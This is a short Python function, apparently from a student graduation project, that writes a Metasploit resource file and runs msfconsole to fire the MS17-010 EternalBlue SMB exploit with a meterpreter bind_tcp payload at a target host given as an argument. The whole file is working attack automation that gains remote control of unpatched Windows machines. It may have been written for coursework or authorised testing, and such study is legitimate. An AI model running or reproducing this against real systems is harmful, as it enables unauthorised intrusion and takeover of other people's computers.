import os


def sds(argv1,argv2):
    argv1=argv1
    argv2=argv2
    config=open('yhzl.rc','w')
    config.write('use exploit/windows/smb/ms17_010_eternalblue'+"\n")
    config.write('set PAYLOAD windows/x64/meterpreter/bind_tcp'+"\n")
    config.write('set RHOST '+argv1+"\n")
    config.write('set LHOST '+argv2+"\n")
    config.write('exploit'+"\n")
    mg=os.popen("msfconsole -r E:\毕业设计\ending\ending\myApp\yhzl.rc")
    return mg
